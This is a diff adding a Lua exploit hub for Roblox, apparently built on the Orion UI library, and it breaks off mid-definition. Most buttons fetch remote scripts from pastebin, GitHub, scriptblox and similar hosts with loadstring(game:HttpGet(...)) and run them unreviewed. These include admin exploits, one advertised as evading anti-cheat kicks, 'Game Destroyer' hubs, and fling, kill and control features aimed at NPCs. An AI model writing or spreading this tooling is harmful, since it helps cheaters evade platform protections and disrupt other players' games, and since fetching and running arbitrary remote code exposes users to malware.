+})
+Tab:AddButton({
+	Name = "Versus",
+	Callback = function()
+      	loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Roblox-VEREUS-monster-script-3746"))();
+  	end   
+})
+Tab:AddButton({
+	Name = "Winged Titan",
+	Callback = function()
+    loadstring(game:GetObjects("rbxassetid://3593786550")[1].Source)()  	
+  	end   
+})
+Tab:AddButton({
+	Name = "Part Surround",
+	Callback = function()
+      loadstring(game:GetObjects("rbxassetid://3546680077")[1].Source)()	
+  	end   
+})
+Tab:AddButton({
+	Name = "Drone",
+	Callback = function()
+   loadstring(game:GetObjects("rbxassetid://3074236927")[1].Source)()    	
+  	end   
+})
+Tab:AddButton({
+	Name = "Noise",
+	Callback = function()
+      	loadstring(game:GetObjects("rbxassetid://3193712297")[1].Source)()
+  	end   
+})
+Tab:AddButton({
+	Name = "Tail",
+	Callback = function()
+     loadstring(game:GetObjects("rbxassetid://3041387168")[1].Source)()
+  	end   
+})
+      Tab:AddButton({
+	Name = "Star Glitcher",
+	Callback = function()
+  loadstring(game:GetObjects("rbxassetid://3074734519")[1].Source)()    	
+  	end   
+})
+Tab:AddButton({
+	Name = "Tentacles",
+	Callback = function()
+  loadstring(game:GetObjects("rbxassetid://3074817074")[1].Source)()   
+          
+  	end   
+})
+Tab:AddButton({
+	Name = "Ravenger",
+	Callback = function()
+     loadstring(game:GetObjects("rbxassetid://3040945482")[1].Source)() 	
+  	end   
+})
+      
+Tab:AddButton({
+  Name = "John doe",
+  Callback = function()
+ loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-John-doe-script-by-g00byd0lan-10381"))()
+    end   
+})
+Tab:AddButton({
+  Name = "Grab Knife V1",
+  Callback = function()
+  loadstring(game:HttpGet("https://pastebin.com/raw/SSAzNj10", true))()    	
+    end
+})
+
+Tab:AddButton({
+  Name = "Grab Knife V2",
+  Callback = function()
+     loadstring(game:HttpGet("https://pastebin.com/raw/Bw7aWTBL", true))() 	
+    end   
+})
+Tab:AddButton({
+  Name = "Grab Knife V3",
+  Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/frHvA27v", true))()
+    end   
+})
+Tab:AddButton({
+  Name = "Grab Knife V4",
+  Callback = function()
+     loadstring(game:HttpGet("https://pastebin.com/raw/ANs9UDrn", true))() 	
+    end   
+})
+Tab:AddButton({
+  Name = "666",
+  Callback = function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/d56eg7r9"))()  	
+    end   
+})
+
+Tab:AddButton({
+  Name = "Lua Hammer",
+  Callback = function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/RKY5fTXh", true))()  	
+    end   
+})
+  Tab:AddButton({
+  Name = "Ball Bomb",
+  Callback = function()
+   loadstring(game:HttpGet("https://pastebin.com/raw/5MMWBpcF"))()   	
+    end   
+})
+  Tab:AddButton({
+  Name = "WTF bomb",
+  Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/TbfGQE3Y"))()
+    end   
+})
+Tab:AddButton({
+  Name = "Brock",
+  Callback = function()
+     loadstring(game:HttpGet("https://pastebin.com/raw/LvRVzzTL", true))() 	
+    end   
+})
+Tab:AddButton({
+  Name = "Brid Wings",
+  Callback = function()
+   loadstring(game:HttpGet("https://pastebin.com/raw/zCypYHjJ", true))()   	
+    end   
+})
+Tab:AddButton({
+  Name = "Doge",
+  Callback = function()
+   loadstring(game:HttpGet("https://pastebin.com/raw/31xeU3pX", true))()   	
+    end   
+})
+Tab:AddButton({
+  Name = "Dev Uzi",
+  Callback = function()
+   loadstring(game:HttpGet("https://pastebin.com/raw/X2n20xqM", true))()   	
+    end   
+})
+Tab:AddButton({
+  Name = "Trump Titan",
+  Callback = function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaGunsX/LuasLegacyScripts/main/%5BTitans%5D%20Trump", true))()  	
+    end   
+})
+Tab:AddButton({
+  Name = "UVG",
+  Callback = function()
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaGunsX/LuasLegacyScripts/main/%5BGUI%5D%20Ultimate%20Van%20GUI", true))()   	
+    end   
+})
+Tab:AddButton({
+  Name = "iOrb 2.0",
+  Callback = function()
+   loadstring(game:HttpGet("https://files.catbox.moe/uhtmgb.lua", true))()   	
+    end   
+})
+Tab:AddButton({
+  Name = "Doritus Particles",
+  Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/KWmEQMkq"))()
+    end   
+})
+      Tab:AddButton({
+  Name = "Mlg Particles",
+  Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/nriGxMtT"))()
+    end   
+})
+      Tab:AddButton({
+  Name = "Illuminati Particles",
+  Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/UPAA82Fk"))()
+    end   
+})
+      Tab:AddButton({
+  Name = "Anonymous Particles",
+  Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/ryand56/Scripts/Scripts/anonymous%20all.txt"))()
+    end   
+})
+Tab:AddButton({
+  Name = "Donald Trump Particles",
+  Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/PJx5RP5F"))()
+    end   
+})
+Tab:AddButton({
+  Name = "RC7 Particles",
+  Callback = function()
+      loadstring(game:HttpGet("https://pastebin.com/raw/cwvCvJ2g"))()	
+    end   
+})
+
+
+local Section = Tab:AddSection({
+  Name = "Place"
+})
+Tab:AddButton({
+  Name = "skeleton skybox",
+  Callback = function()
+        imageOne = "http://www.roblox.com/asset/?id=169585459"
+
+imageTwo = "http://www.roblox.com/asset/?id=169585475"
+
+imageThree = "http://www.roblox.com/asset/?id=169585485"
+
+imageFour = "http://www.roblox.com/asset/?id=169585502"
+
+imageFive = "http://www.roblox.com/asset/?id=169585515"
+
+imageSix = "http://www.roblox.com/asset/?id=169585502"
+
+imageSeven = "http://www.roblox.com/asset/?id=169585485"
+
+imageEight = "http://www.roblox.com/asset/?id=169585475"
+
+
+
+Spooky = Instance.new("Sound", workspace)
+
+Spooky.Name = "Spooky"
+
+Spooky.SoundId = "rbxassetid://174270407"
+
+Spooky.Volume = 15
+
+Spooky.Looped = true
+
+Spooky:Play()
+
+
+
+Sky = Instance.new("Sky", game.Lighting)
+
+Sky.SkyboxBk = imageOne
+
+Sky.SkyboxDn = imageOne
+
+Sky.SkyboxFt = imageOne
+
+Sky.SkyboxLf = imageOne
+
+Sky.SkyboxRt = imageOne
+
+Sky.SkyboxUp = imageOne
+
+
+
+
+
+while true do
+
+    Sky.SkyboxBk = imageOne
+
+    Sky.SkyboxDn = imageOne
+
+    Sky.SkyboxFt = imageOne
+
+    Sky.SkyboxLf = imageOne
+
+    Sky.SkyboxRt = imageOne
+
+    Sky.SkyboxUp = imageOne
+
+    wait(0.15)
+
+    Sky.SkyboxBk = imageTwo
+
+    Sky.SkyboxDn = imageTwo
+
+    Sky.SkyboxFt = imageTwo
+
+    Sky.SkyboxLf = imageTwo
+
+    Sky.SkyboxRt = imageTwo
+
+    Sky.SkyboxUp = imageTwo
+
+    wait(0.15)
+
+    Sky.SkyboxBk = imageThree
+
+    Sky.SkyboxDn = imageThree
+
+    Sky.SkyboxFt = imageThree
+
+    Sky.SkyboxLf = imageThree
+
+    Sky.SkyboxRt = imageThree
+
+    Sky.SkyboxUp = imageThree
+
+    wait(0.15)
+
+    Sky.SkyboxBk = imageFour
+
+    Sky.SkyboxDn = imageFour
+
+    Sky.SkyboxFt = imageFour
+
+    Sky.SkyboxLf = imageFour
+
+    Sky.SkyboxRt = imageFour
+
+    Sky.SkyboxUp = imageFour
+
+    wait(0.15)
+
+    Sky.SkyboxBk = imageFive
+
+    Sky.SkyboxDn = imageFive
+
+    Sky.SkyboxFt = imageFive
+
+    Sky.SkyboxLf = imageFive
+
+    Sky.SkyboxRt = imageFive
+
+    Sky.SkyboxUp = imageFive
+
+    wait(0.15)
+
+    Sky.SkyboxBk = imageSix
+
+    Sky.SkyboxDn = imageSix
+
+    Sky.SkyboxFt = imageSix
+
+    Sky.SkyboxLf = imageSix
+
+    Sky.SkyboxRt = imageSix
+
+    Sky.SkyboxUp = imageSix
+
+    wait(0.15)
+
+    Sky.SkyboxBk = imageSeven
+
+    Sky.SkyboxDn = imageSeven
+
+    Sky.SkyboxFt = imageSeven
+
+    Sky.SkyboxLf = imageSeven
+
+    Sky.SkyboxRt = imageSeven
+
+    Sky.SkyboxUp = imageSeven
+
+    wait(0.15)
+
+    Sky.SkyboxBk = imageEight
+
+    Sky.SkyboxDn = imageEight
+
+    Sky.SkyboxFt = imageEight
+
+    Sky.SkyboxLf = imageEight
+
+    Sky.SkyboxRt = imageEight
+
+    Sky.SkyboxUp = imageEight
+
+    wait(0.15)
+
+
+
+            end
+    end   
+})
+Tab:AddButton({
+  Name = "Decal",
+  Callback = function()
+      local ID =13784335227 --id here
+function spamDecal(v)
+    if v:IsA("Part") then
+        for i=0, 5 do
+            D = Instance.new("Decal")
+            D.Name = "MYDECALHUE"
+            D.Face = i
+            D.Parent = v
+            D.Texture = ("http://www.roblox.com/asset/?id="..Id)
+        end
+    else
+        if v:IsA("Model") then
+            for a,b in pairs(v:GetChildren()) do
+                spamDecal(b)
+            end
+        end
+    end
+end
+function decalspam(id) --use this function, not the one on top
+    Id = id
+    for i,v in pairs(game.Workspace:GetChildren()) do
+        if v:IsA("Part") then
+        for i=0, 5 do
+            D = Instance.new("Decal")
+            D.Name = "MYDECALHUE"
+            D.Face = i
+            D.Parent = v
+            D.Texture = ("http://www.roblox.com/asset/?id="..id)
+        end
+    else
+        if v:IsA("Model") then
+            for a,b in pairs(v:GetChildren()) do
+                spamDecal(b)
+            end
+        end
+    end
+end
+end
+
+decalspam(ID)	
+    end   
+})
+
+Tab:AddButton({
+  Name = "Night",
+  Callback = function()
+      while true do 
+    print ("Loop cycle start")
+    game.Lighting.TimeOfDay = "23:00:00"
+    wait(0.5)
+            end	
+    end   
+})
+Tab:AddButton({
+  Name = "Disco",
+  Callback = function()
+        while true do
+ wait(0.5)
+ game.Lighting.Ambient = Color3.new(math.random(), math.random(), math.random())
+ game.Lighting.ColorShift_Top = Color3.new(math.random(), math.random(), math.random())
+ game.Lighting.ColorShift_Bottom = Color3.new(math.random(), math.random(), math.random())
+ game.Lighting.ShadowColor = Color3.new(math.random(), math.random(), math.random())
+            end
+    end   
+})
+Tab:AddButton({
+  Name = "666",
+  Callback = function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/d56eg7r9"))()  	
+    end   
+})
+Tab:AddButton({
+  Name = "666 2",
+  Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/H5td8jx4"))()
+    end   
+})
+Tab:AddButton({
+  Name = "666 3",
+  Callback = function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/BcB1x3D0"))()  	
+    end   
+})
+
+local AdminS = Window:MakeTab({
+  Name = "Admins",
+  Icon = "rbxassetid://6034281908",
+  PremiumOnly = false
+})
+
+AdminS:AddButton({
+  Name = "Infinite Yield OP",
+  Callback = function()
+        loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
+    end    
+})
+
+AdminS:AddButton({
+  Name = "Nameless Admin (No byfron Kick) OP",
+  Callback = function()
+     loadstring(game:HttpGet("https://raw.githubusercontent.com/FD2Team/Nameless-Admin-No-Byfron-Kick/main/Source",true))() 	
+    end   
+})
+
+AdminS:AddButton({
+  Name = "Leg Admin",
+  Callback = function()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/leg1337/legadmv2/main/legadminv2.lua'))()
+    end   
+})
+
+AdminS:AddButton({
+  Name = "CMD-X",
+  Callback = function()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source', true))()
+    end    
+})
+
+AdminS:AddButton({
+  Name = "IV Admin (works only with some executors) OP",
+  Callback = function()
+      loadstring(game:HttpGet('https://raw.githubusercontent.com/BloodyBurns/Hex/main/Iv%20Admin%20v3.lua'))()	
+    end   
+})
+
+AdminS:AddButton({
+  Name = "Reviz Admin",
+  Callback = function()
+        loadstring(game:HttpGet('https://pastebin.com/raw/Nh7n0hdX', true))()
+    end    
+})
+
+AdminS:AddButton({
+  Name = "Shattervast Admin",
+  Callback = function()
+        loadstring(game:HttpGet('https://pastebin.com/raw/iL4NRDux', true))()
+    end
+})
+
+AdminS:AddButton({
+  Name = "Fates Admin",
+  Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua"))();
+    end    
+})
+
+AdminS:AddButton({
+  Name = "Adonis Admin",
+  Callback = function()
+        loadstring(game:HttpGet("https://paste.ee/r/HYshM"))();
+    end    
+})
+AdminS:AddButton({
+  Name = "Homebrew Admin",
+  Callback = function()
+        _G.CustomUI = false
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/mgamingpro/HomebrewAdmin/master/Main'),true))()
+    end    
+})
+
+AdminS:AddButton({
+  Name = "Kohls Admin",
+  Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/237ERiAT"))();
+    end    
+})
+
+AdminS:AddButton({
+  Name = "IceGear Admin",
+  Callback = function()
+loadstring(game:HttpGet(('https://paste.ee/r/e6T8l'),true))()
+    end    
+})
+AdminS:AddButton({
+  Name = "Overflow Admin",
+  Callback = function()
+loadstring(game:HttpGet(('https://paste.ee/r/KaeZg'),true))()
+              end
+            })
+
+AdminS:AddButton({
+  Name = "Ultimate Admin",
+  Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/bVjM0xCS", true))()
+    end
+})
+
+local NPC = Window:MakeTab({
+	Name = "NPCs",
+	Icon = "rbxassetid://6034287516",
+	PremiumOnly = false --- Set true, if you want to this tab was only for premium people, or false to all could use this.
+})
+local NPCTarget
+
+NPC:AddTextbox({
+	Name = "NPC Name",
+	Default = "",
+	TextDisappear = true,
+	Callback = function(NPClol)
+		local Target = unpack(GetNPC(NPClol))
+		NPCTarget = Target
+	end		  
+})
+
+NPC:AddToggle({
+	Name = "Walk To NPC",
+	Default = false,
+	Callback = function(Walkn)
+        if Walkn == true then
+            if plr.Character:FindFirstChildOfClass('Humanoid') and plr.Character:FindFirstChildOfClass('Humanoid').SeatPart then
+		plr.Character:FindFirstChildOfClass('Humanoid').Sit = false
+		wait(.1)
+	end
+	    if WalkTo == false then
+		WalkTo = true
+		repeat wait()
+		     plr.Character:FindFirstChild("Humanoid"):MoveTo(getRoot(NPCTarget).Position)
+			 until NPCTarget == nil or not getRoot(NPCTarget) or WalkTo == false	
+	end
+		else
+		    Walkn = false
+			WalkTo = false
+		end		
+  end    
+})
+
+NPC:AddToggle({
+	Name = "Pathfind Walk To NPC",
+	Default = false,
+	Callback = function(Walkns)
+        if Walkns == true then
+            WalkTo = false
+	local PathService = game:GetService("PathfindingService")
+	local hum = plr.Character:FindFirstChildOfClass("Humanoid")
+	local path = PathService:CreatePath()
+	
+	if WalkTo == false then
+		WalkTo = true
+	repeat wait()
+		local success, response = pcall(function()
+			path:ComputeAsync(getRoot(plr.Character).Position, getRoot(NPCTarget).Position)
+			local waypoints = path:GetWaypoints()
+			local distance 
+			for waypointIndex, waypoint in pairs(waypoints) do
+				local waypointPosition = waypoint.Position
+				hum:MoveTo(waypointPosition)
+				repeat 
+					distance = (waypointPosition - hum.Parent.PrimaryPart.Position).magnitude
+					wait()
+				until
+				distance <= 5
+			end	 
+		end)
+		if not success then
+			plr.Character:FindFirstChildOfClass('Humanoid'):MoveTo(getRoot(NPCTarget).Position)
+		end
+		until NPCTarget == nil or not getRoot(NPCTarget) or WalkTo == false
+		end
+		else
+		    Walkns = false
+			WalkTo = false
+		end		
+  end    
+})
+
+NPC:AddToggle({
+	Name = "Control NPC",
+	Default = false,
+	Callback = function(Controlwho)
+        if Controlwho == true then
+            if Control == false then
+       Control = true
+       local Char = NPCTarget
+       plr.Character = NPCTarget
+       game.Workspace.CurrentCamera.CameraSubject = NPCTarget:FindFirstChildWhichIsA("Humanoid")
+       Char.Animate.Disabled = true
+       wait(0.1)
+       Char.Animate.Disabled = false
+ end
+       if not simRadius then
+				SimRad()
+			end
+		else
+		    Controlwho = false
+			Control = false
+			Control = false
+    plr.Character = Workspace[plr.Name]
+    game.Workspace.CurrentCamera.CameraSubject = plr.Character
+    Workspace[plr.Name].Animate.Disabled = true
+       wait(0.1)
+       Workspace[plr.Name].Animate.Disabled = false
+		end		
+  end    
+})
+
+NPC:AddButton({
+	Name = "unAnchored Parts to NPC",
+	Callback = function()
+		if sethidden then
+			local Forces = {}
+			for _,part in pairs(game.Workspace:GetDescendants()) do
+				if NPCTarget:FindFirstChild("Head") and part:IsA("BasePart" or "UnionOperation" or "Model") and part.Anchored == false and not part:IsDescendantOf(plr.Character) and part.Name == "Torso" == false and part.Name == "Head" == false and part.Name == "Right Arm" == false and part.Name == "Left Arm" == false and part.Name == "Right Leg" == false and part.Name == "Left Leg" == false and part.Name == "HumanoidRootPart" == false then
+					for i,c in pairs(part:GetChildren()) do
+						if c:IsA("BodyPosition") or c:IsA("BodyGyro") then
+							c:Destroy()
+						end
+					end
+					local ForceInstance = Instance.new("BodyPosition")
+					ForceInstance.Parent = part
+					ForceInstance.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
+					table.insert(Forces, ForceInstance)
+					if not table.find(frozenParts,part) then
+						table.insert(frozenParts,part)
+					end
+				end
+			end
+			if not simRadius then
+				SimRad()
+			end
+			for i,c in pairs(Forces) do
+				c.Position = NPCTarget.Head.Position
+			end
+		end
+	end    
+})
+
+NPC:AddButton({
+	Name = "Teleport To NPC",
+	Callback = function()
+      	plr.Character.HumanoidRootPart.CFrame = NPCTarget:GetModelCFrame()
+  	end    
+})
+
+NPC:AddButton({
+	Name = "Vehicle Teleport to NPC",
+	Callback = function()
+		if NPCTarget ~= nil then
+			local seat = plr.Character:FindFirstChildOfClass('Humanoid').SeatPart
+			local vehicleModel = seat.Parent
+			repeat
+				if vehicleModel.ClassName ~= "Model" then
+					vehicleModel = vehicleModel.Parent
+				end
+			until vehicleModel.ClassName == "Model"
+			for i,v in pairs(vehicleModel:GetDescendants()) do
+				if v:IsA("BasePart") then
+				   v:MoveTo(NPCTarget.HumanoidRootPart.Position)
+				end   
+			end
+			for i,v in pairs(vehicleModel.Parent:GetDescendants()) do
+				if v:IsA("BasePart") and v.Anchored then
+					if v.Anchored == false then
+				   v:MoveTo(NPCTarget.HumanoidRootPart.Position)
+				   end
+				end   
+			end
+			wait(0.1)
+			vehicleModel:MoveTo(NPCTarget.HumanoidRootPart.Position)
+	end
+	end    
+})
+
+NPC:AddButton({
+	Name = "Fling Noclipped NPC",
+	Callback = function()
+flinghh = 1000
+local lp = game.Players.LocalPlayer
+
+if type(NPCTarget) == "string" then return end
+
+local oldpos = lp.Character.HumanoidRootPart.CFrame
+local oldhh = lp.Character.Humanoid.HipHeight
+
+local carpetAnim = Instance.new("Animation")
+carpetAnim.AnimationId = "rbxassetid://282574440"
+carpet = lp.Character:FindFirstChildOfClass('Humanoid'):LoadAnimation(carpetAnim)
+carpet:Play(.1, 1, 1)
+
+local carpetLoop
+
+local tTorso = NPCTarget:FindFirstChild("Torso") or NPCTarget:FindFirstChild("LowerTorso") or NPCTarget:FindFirstChild("HumanoidRootPart")
+
+spawn(function()
+    carpetLoop = game:GetService('RunService').Heartbeat:Connect(function()
+	    pcall(function()
+	        if tTorso.Velocity.magnitude <= 28 then -- if target uses netless just target their local position
+    	        local pos = {x=0, y=0, z=0}
+        		pos.x = tTorso.Position.X
+        		pos.y = tTorso.Position.Y
+        		pos.z = tTorso.Position.Z
+        		pos.x = pos.x + tTorso.Velocity.X / 2
+        		pos.y = pos.y + tTorso.Velocity.Y / 2
+        		pos.z = pos.z + tTorso.Velocity.Z / 2
+    		    lp.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(pos.x,pos.y,pos.z))
+    		else
+    		    lp.Character.HumanoidRootPart.CFrame = tTorso.CFrame
+		    end
+	    end)
+    end)
+end)
+
+wait()
+
+lp.Character.Humanoid.HipHeight = flinghh
+
+wait(.5)
+
+carpetLoop:Disconnect()
+wait()
+lp.Character.Humanoid.Health = 0
+wait(game.Players.RespawnTime + .6)
+lp.Character.HumanoidRootPart.CFrame = oldpos
+  	end    
+})
+
+NPC:AddToggle({
+	Name = "View NPC",
+	Default = false,
+	Callback = function(View)
+        if View == true then
+		viewing = NPCTarget
+		game.Workspace.CurrentCamera.CameraSubject = viewing
+		else
+		    View = false
+	game.Workspace.CurrentCamera.CameraSubject = plr.Character
+		end		
+  end    
+})
+
+NPC:AddButton({
+	Name = "Notify Information about NPC",
+	Callback = function()
+      	OrionLib:MakeNotification({
+	Name = "Information about NPC:",
+	Content = 'Name: '..NPCTarget.Name..' | Health: '..round(NPCTarget:FindFirstChildOfClass('Humanoid').Health, 1)..' | WalkSpeed: '..NPCTarget:FindFirstChildOfClass("Humanoid").WalkSpeed..' | JumpPower: '..NPCTarget:FindFirstChildOfClass("Humanoid").JumpPower,
+	Image = "",
+	Time = 10
+})
+  	end    
+})
+
+NPC:AddToggle({
+	Name = "Stare At NPC",
+	Default = false,
+	Callback = function(Stareqs)
+        if Stareqs == true then
+		if stareLoop then
+			stareLoop:Disconnect()
+		end
+		if not plr.Character:FindFirstChild("HumanoidRootPart") and NPCTarget:FindFirstChild("HumanoidRootPart") then return end
+		local function stareFunc()
+			if plr.Character.PrimaryPart and NPCTarget ~= nil and NPCTarget:FindFirstChild("HumanoidRootPart") then
+				local chrPos= plr.Character.PrimaryPart.Position
+				local tPos= NPCTarget:FindFirstChild("HumanoidRootPart").Position
+				local modTPos=Vector3.new(tPos.X,chrPos.Y,tPos.Z)
+				local newCF=CFrame.new(chrPos,modTPos)
+				plr.Character:SetPrimaryPartCFrame(newCF)
+			elseif not NPCTarget:FindFirstChild(v) then
+				stareLoop:Disconnect()
+			end
+		end
+
+		stareLoop = game:GetService("RunService").RenderStepped:Connect(stareFunc)
+		else
+		    Stareqs = false
+			if stareLoop then
+		stareLoop:Disconnect()
+	end
+		end		
+  end    
+})
+
+NPC:AddToggle({
+	Name = "Fling NPC",
+	Default = false,
+	Callback = function(Flinglols)
+        if Flinglols == true then
+            plr.Character.Humanoid.PlatformStand = Platformstand
+			Flinging = true
+	local Thrust = Instance.new("BodyThrust", plr.Character.HumanoidRootPart)
+	Thrust.Force = Vector3.new(100000, 100000, 100000)
+	Thrust.Name = "FlingForce"
+	repeat
+		plr.Character.HumanoidRootPart.CFrame = NPCTarget.HumanoidRootPart.CFrame
+		Thrust.Location = getRoot(NPCTarget).Position
+		game:GetService('RunService').Heartbeat:Wait()
+	until not getRoot(NPCTarget) or Flinging == false
+		else
+		    Flinglols = false
+			Flinging = false
+			plr.Character.Humanoid.PlatformStand = false
+	for i,v in pairs(plr.Character.HumanoidRootPart:GetChildren()) do
+		if v.Name == "FlingForce" and v:IsA("BodyThrust") then
+			v:Destroy()
+		end
+	end
+		end		
+  end    
+})
+
+NPC:AddToggle({
+	Name = "PlatformStand Fling",
+	Default = false,
+	Callback = function(pzFlinglol)
+        if pzFlinglol == true then
+            Platformstand = true
+		else
+		    pzFlinglol = false
+			Platformstand = false
+		end		
+  end    
+})
+
+NPC:AddButton({
+	Name = "ToolHandle Kill NPC",
+	Callback = function()
+      	local Char = plr.Character
+local RS = game:GetService("RunService").RenderStepped
+local Tool = Char:FindFirstChildWhichIsA("Tool")
+local Handle = Tool and Tool:FindFirstChild("Handle")
+if not Tool or not Handle then
+   return game.StarterGui:SetCore("SendNotification", {Title = "Warning!", Text = "You need to hold a 'Tool' that does damage on touchinterest. For example Sword or Knife.", Duration = 4,})
+end
+task.spawn(function()
+   while Tool and Char and NPCTarget and Tool.Parent == Char do
+           local Human = NPCTarget:FindFirstChildWhichIsA("Humanoid")
+           if not Human or Human.Health <= 0 then
+                   break
+           end
+           for i, v1 in ipairs(NPCTarget:GetChildren()) do
+                   v1 = ((v1:IsA("BasePart") and firetouchinterest(Handle, v1, 1, (RS.Wait(RS) and nil) or firetouchinterest(Handle, v1, 0)) and nil) or v1) or v1
+           end
+   end
+   game.StarterGui:SetCore("SendNotification", {Title = "Done!", Text = "ToolHandle Kill Stopped. Because npc died or you just unequipped the tool.", Duration = 4,})
+end)
+  	end    
+})
+
+NPC:AddButton({
+	Name = "Look At NPC",
+	Callback = function()
+      	local preMaxZoom = game.Players.LocalPlayer.CameraMaxZoomDistance
+	local preMinZoom = game.Players.LocalPlayer.CameraMinZoomDistance
+	if plr.CameraMaxZoomDistance ~= 0.5 then
+		preMaxZoom = plr.CameraMaxZoomDistance
+		preMinZoom = plr.CameraMinZoomDistance
+	end
+	plr.CameraMaxZoomDistance = 0.5
+	plr.CameraMinZoomDistance = 0.5
+	wait()
+		if NPCTarget and NPCTarget:FindFirstChild('Head') then
+			game.Workspace.CurrentCamera.CFrame = CFrame.new(game.Workspace.CurrentCamera.CFrame.p, NPCTarget.Head.CFrame.p)
+			wait(0.1)
+		end
+	plr.CameraMaxZoomDistance = preMaxZoom
+	plr.CameraMinZoomDistance = preMinZoom
+  	end    
+})
+
+local Tab = Window:MakeTab({
+  Name = "Hubs/Guis",
+  Icon = "rbxassetid://6035053285",
+  PremiumOnly = false
+})
+
+local Section = Tab:AddSection({
+        Name = " Universal Hubs"
+})
+
+Tab:AddButton({
+  Name = "Game Destroyer Hub",
+  Callback = function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/TakeModzz/Games-HUB-Destroyer-V4/main/Games%20HUB%20Destroyer%20V4"))()   	
+    end   
+})
+
+Tab:AddButton({
+  Name = "Goust Hub",
+  Callback = function()
+      loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/GhostHub'))()	
+    end   
+})
+
+Tab:AddButton({
+  Name = "Ez Hub",
+  Callback = function()
+   loadstring(game:HttpGet("https://scriptblox.com/raw/Ez-Hub_168"))()   	
+    end   
+})
+
+Tab:AddButton({
+  Name = "Unfair Hub",
+  Callback = function()
+     loadstring(game:HttpGet(('https://raw.githubusercontent.com/rblxscriptsnet/unfair/main/rblxhub.lua'),true))() 	
+    end   
+})
+
+Tab:AddButton({
+  Name = "Owl Hub",
+  Callback = function()
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/CriShoux/OwlHub/master/OwlHub.txt"))();   	
+    end   
+})
+
+Tab:AddButton({
+  Name = "Pendulam Hub",
+  Callback = function()
+     loadstring(game:HttpGet("https://raw.githubusercontent.com/Tescalus/Pendulum-Hubs-Source/main/Pendulum%20Hub%20V5.lua"))() 	
+    end   
+})
+
+Tab:AddButton({
+  Name = "Universal juanko hub",
+  Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Juanko-Scripts/Roblox-scripts/main/Juanko%20Universal%20Hub%20OfuscasteLinkServerFile73829273728288ejfjshsrytdoudt7do"))()
+    end   
+})
+
+Tab:AddButton({
+  Name = "hydro hub ",
+  Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/FRX397/Hydrohub/main/Hydro_hub", true))()
+    end   
+})
+
+Tab:AddButton({
+  Name = "Rose hub",
+  Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/IlikeyocutgHAH/rose-hub/main/aaa"))()
+    end   
+})
+
+Tab:AddButton({
+  Name = "Game Hub",
+  Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/GamerScripter/Game-Hub/main/loader"))()
+    end   
+})
+
+Tab:AddButton({
+  Name = "GigaChad Hub",
+  Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/OWJBWKQLAISH/GigaChad-Hub/main/Protected_3038811338432694.lua.txt"))()
+    end   
+})
+
+Tab:AddButton({
+  Name = "Spanish Hub",
+  Callback = function()
+        loadstring(game:HttpGet("https://paste.myconan.net/489741.txt"))()
+    end   
+})
+
+Tab:AddButton({
+	Name = "Ghub ",
+	Callback = function()
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/gclich/GHUBV14XZ/main/Ghub_Main_Loader.txt"))()   	
+  	end   
+})
+
+Tab:AddButton({
+  Name = "Universal Hub",
+  Callback = function()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/Dvrknvss/UniversalFEScriptHub/main/Script'))()
+    end   
+})
+Tab:AddButton({
+  Name = "Domain X",
+  Callback = function()
+        loadstring(game:HttpGet("https://scriptblox.com/raw/DomainX_254"))()
+    end   
+})
+Tab:AddButton({
+  Name = "Orca X",
+  Callback = function()
+        loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/richie0866/orca/master/public/latest.lua"))() 
+    end   
+})
+Tab:AddButton({
+  Name = "Orange X Hub",
+  Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/ImJosh66/Ab2rW/main/ORANGEX%20V5%20RELEASED%20ORANGEX%20ON%20TOP%20.txt"))()
+    end   
+})
+Tab:AddButton({
+  Name = "Moon hub",
+  Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/Gae7YC84"))()
+    end   
+})
+Tab:AddButton({
+  Name = "Moon Ui",
+  Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/dqtixz/Projeto-LKA-Moon-UI-Remake-By-dqtixz/main/V12"))();
+    end   
+})
+Tab:AddButton({
+  Name = "Opfinality Hub",
+  Callback = function()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/IlikeyocutgHAH12/EUOHFIWIDKA/main/FE%20Gui.txt'))()
+    end   
+})
+Tab:AddButton({
+  Name = "Comet Hub",
+  Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/FE/main/Comet"))();
+    end   
+})
+Tab:AddButton({
+  Name = "Dark Hub",
+  Callback = function()
